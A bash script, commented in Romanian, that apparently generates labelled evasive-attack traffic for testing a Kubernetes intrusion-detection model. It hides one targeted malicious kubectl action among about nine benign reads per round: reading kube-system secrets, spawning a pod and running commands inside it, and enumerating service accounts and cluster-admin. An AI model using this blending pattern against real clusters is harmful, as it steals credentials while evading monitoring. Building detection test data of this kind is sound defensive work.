#!/bin/bash
# Atac EVAZIV (low-and-slow / mimetism): adversary-external (credențial valid, forbid~0) își DILUEAZĂ
# acțiunile malițioase — ~9 citiri benigne : 1 malițioasă țintită per rundă. Fiecare fereastră de 20 are
# preponderent benign  testează dacă modelul (antrenat pe rafale dense) prinde atacul diluat.
set -uo pipefail
W=/tmp/ids_collect; KC="$W/kubeconfig-adversary-external"
A(){ kubectl --kubeconfig "$KC" "$@" >/dev/null 2>&1 || true; }
ROUNDS="${ROUNDS:-25}"
OUT="$(cd "$(dirname "$0")" && pwd)/reference_dataset"
echo "EVASION_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee "$OUT/evasion_window.txt"
for r in $(seq 1 "$ROUNDS"); do
  # ~9 acțiuni benigne (mimează un admin care lucrează normal)
  A get pods -n default; A get services -A; A get configmaps -n default; A get deployments -A
  A get nodes; A get pods -n kube-system; A get events -A; A get namespaces; A get replicasets -A
  # ~1 acțiune malițioasă ȚINTITĂ (nu enumerare -A), diluată
  case $((r % 4)) in
    0) s=$(kubectl --kubeconfig "$KC" get secrets -n kube-system -o jsonpath='{.items[0].metadata.name}' 2>/dev/null||true); [ -n "$s" ] && A get secret "$s" -n kube-system -o yaml ;;
    1) A run stlth-$r --image=alpine --restart=Never -- sleep 300; kubectl --kubeconfig "$KC" wait --for=condition=ready pod/stlth-$r --timeout=20s >/dev/null 2>&1||true; A exec stlth-$r -- id; A delete pod stlth-$r --force --grace-period=0 ;;
    2) A get serviceaccounts -n kube-system ;;
    3) A get clusterrole cluster-admin ;;
  esac
  echo "   evasiv $r/$ROUNDS"
done
echo "EVASION_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$OUT/evasion_window.txt"
echo "GATA atac evaziv."
